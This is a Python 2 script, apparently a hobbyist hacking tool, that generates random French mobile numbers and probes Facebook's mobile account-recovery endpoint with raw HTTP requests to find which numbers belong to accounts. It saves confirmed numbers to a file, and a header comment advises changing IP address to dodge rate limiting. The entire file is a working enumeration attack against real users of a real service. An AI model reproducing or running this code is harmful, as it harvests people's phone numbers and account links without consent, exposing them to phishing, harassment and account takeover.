# -*- coding: utf-8 -*-
#warning
'''
approximately over 10 min change your ip
'''
import socket
import time
import random  
print "       /-------------------------------/ "
print "     >   facebook has no security    > "
print "    /                                            /  "     
print "   /          Adel python              / "     
print "  /--------------------------------/  "        
                                               
vomit = open('num.txt' , 'w')
time.sleep(5)
print """

































"""
print """
1) Avenir Telecom ,Virgin Mobile France
2) Société française ,Transatel
"""
a=raw_input('            choose the number carrier :')
if a == '1' :
    start = '07'
elif a == '2' :
    start = '06'
else :
    print "write the true option"
    exit()
b=raw_input('          Write the last two number :')
if len(b) == 2 :
    try :
        x = '0'
    except ValueError :
        print "write num not else "
        exit()
else :
    print " write true value "
    exit()

def id_gen(size=6, chars='0192837465'):
    return ''.join(random.choice(chars) for _ in range(size))
 
def id_num(size=6, chars=x):
    return ''.join(chars for _ in range(size))

while True :
    b=str(b)
    val = id_gen()
    num = start + val + b
    print num
    connect='GET / HTTP/1.1\r\nHost: m.facebook.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n'
    connect_f= 'GET /Find%20Your%20Account_files/k97pj8-or6s.png HTTP/1.1\r\nHost: m.facebook.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0\r\nAccept: image/png,image/*;q=0.8,*/*;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://m.facebook.com/\r\nConnection: keep-alive\r\n\r\n'
    conn_fav= 'GET /favicon.ico HTTP/1.1\r\nHost: m.facebook.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0\r\nAccept: image/png,image/*;q=0.8,*/*;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n'
    post= 'POST /login/identify/?ctx=recover HTTP/1.1\r\nHost: m.facebook.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://m.facebook.com/\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 135\r\n\r\nlsd=AVpVXu4Z&charset_test=%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84&email=%2B33'+num+'&did_submit=Search'

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('m.facebook.com', 80))
    s.send(connect)
    time.sleep(0.2)

    print 'Connecting to m.facebook.com server'
    s.recv(100000)
    s.send(connect_f)
    time.sleep(0.2)
    print 'Getting cookis'
    s.recv(100000)
    s.send(conn_fav)
    time.sleep(0.2)
    print 'Accepting request'
    s.recv(100000)
    s.send(post)
    time.sleep(0.2)
    print 'Checking for num'
    fil = repr(s.recv(100000))[10:19]
    
    if fil == "302 Found" :
        print " num " + num +  "             is true "
        vomit.write('+33' + num + '\r\n')
        s.close()
    else :
        print " num "+ num + " is wrong "
        s.close()
    
